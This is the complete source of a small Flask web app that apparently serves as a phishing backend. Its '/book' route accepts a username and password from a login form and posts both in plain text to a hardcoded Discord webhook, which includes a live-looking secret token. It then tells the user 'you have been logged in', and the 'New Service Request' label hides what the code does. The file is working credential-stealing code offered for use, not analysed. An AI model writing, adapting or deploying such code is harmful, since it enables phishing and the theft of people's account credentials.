from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546902452488372275/Q1zo8LJWxNzc9yiQHRHmao126nwwROw_sHNVmkBOrY0Y2M6tnOxOWietSEq4XLfj_gJi"


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/book", methods=["POST"])
def book():
    data = request.get_json()

    username = data.get("username", "").strip()
    password = data.get("password", "").strip()

    if not username or not password:
        return jsonify({
            "success": False,
            "message": "Please fill in all fields."
        }), 400

    payload = {
        "embeds": [
            {
                "title": "🔔 New Service Request",
                "fields": [
                    {
                        "name": "username",
                        "value": username,
                        "inline": False
                    },
                    {
                        "name": "password",
                        "value": password,
                        "inline": False
                    }
                ]
            }
        ],
        "allowed_mentions": {
            "parse": []
        }
    }

    response = requests.post(
        DISCORD_WEBHOOK_URL,
        json=payload,
        timeout=10
    )

    if response.status_code in [200, 204]:
        return jsonify({
            "success": True,
            "message": "you have been logged in"
        })

    return jsonify({
        "success": False,
        "message": "Failed to log in"
    }), 500


if __name__ == "__main__":
    app.run(debug=True)

if __name__ == "__main__":
    print("Starting server...")
    app.run(debug=True, port=5000)
